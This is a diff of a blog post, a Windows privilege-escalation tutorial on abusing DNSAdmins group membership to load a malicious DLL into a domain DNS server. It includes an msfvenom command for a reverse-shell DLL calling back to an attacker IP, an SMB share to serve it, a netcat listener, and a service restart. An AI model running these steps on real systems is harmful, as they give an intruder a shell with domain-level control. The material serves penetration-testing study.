@@ -1,5 +1,5 @@
 ---
-title: Windows Privilege Escalation: DNSAdmins to Domain Admins - Server Level DLL Injection
+title: "Windows Privilege Escalation: DNSAdmins to Domain Admins - Server Level DLL Injection"
 layout: post
 author: Abhinav Gyawali
 date: 2019-12-21
@@ -7,14 +7,11 @@ tags: [privesc, windows, dnsadmin]
 permalink: /windows-privilege-escalation-dnsadmin-to-domaincontroller/
 ---
 
-# Windows Privilege Escalation: DNSAdmins to Domain Admins - Server Level DLL Injection
-
 Say you have compromised a Windows machine that provides Active Directory Directory Services to its users and have gained access as a user who is a part of the DNSAdmins group, you can use this method to privilege escalate.
 
 Here, what we're doing is:
-
-1. Making a dll payload that sends a reverse shell back to our machine with msfvenom.
-2. Serving it using SMB Server to make it available to the Windows machine. (You can use any other way to transfer it to the remote machine, but be careful, it might get nuked by the Anti-Virus.) And, we will also setup a netcat listener to catch our reverse shell.
+1. Making a dll payload that sends a reverse shell back to our machine with `msfvenom`.
+2. Serving it using SMB Server to make it available to the Windows machine. (You can use any other way to transfer it to the remote machine, but be careful, it might get nuked by the Anti-Virus.) And, we will also setup a `netcat` listener to catch our reverse shell.
 3. Importing that dll in the DNS Server.
 4. Restarting the DNS Server so that it loads the dll file.
 
@@ -26,7 +23,7 @@ whoami /all
 
 Now, on to the fun part:
 
-#making the payload
+#### Making the payload
 
 ```powershell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.211.55.13 LPORT=4444 --platform=windows -f dll > ~/windows/privesc/plugin.dll
@@ -34,7 +31,9 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.211.55.13 LPORT=4444 --platfo
 
 Here, because the Windows machine is of 64 bit achitechture, we're using x64 payload.
 
-#### Serving the file using SMB Server using smbserver.py, that comes with Python3-Impacket.
+#### Serving the file using SMB Server
+
+We use `smbserver.py`, that comes with `Python3-Impacket`.
 
 ```powershell
 cd /usr/share/doc/python3-impacket/examples
@@ -63,6 +62,3 @@ sc.exe start dns
 ```
 
 Now, go back and check the netcat listener, you should have a reverse shell.
-
-You're Welcome!
-
